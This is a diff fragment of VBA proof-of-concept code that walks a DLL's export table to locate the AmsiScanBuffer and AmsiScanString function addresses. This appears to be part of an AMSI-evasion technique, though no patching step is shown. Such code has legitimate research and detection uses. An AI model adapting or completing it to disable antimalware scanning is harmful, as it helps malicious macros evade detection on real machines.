@@ -103,13 +103,13 @@ Sub POC()
             Debug.Print "Function Addresses Start at:" & Hex(IMAGE_EXPORT_DIRECTORY_FunctionStartAdr)
             
             Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 12), 4
-            AS_String_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
-            Debug.Print "Amsi Scan String Found at:" & Hex(AS_String_Adr)
-            
-            Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 16), 4
             AS_Buffer_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
             Debug.Print "Amsi Scan Buffer Found at:" & Hex(AS_Buffer_Adr)
-             
+            
+            Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 16), 4
+            AS_String_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
+            Debug.Print "Amsi Scan String Found at:" & Hex(AS_String_Adr)
+              
             Exit Do
         End If
     
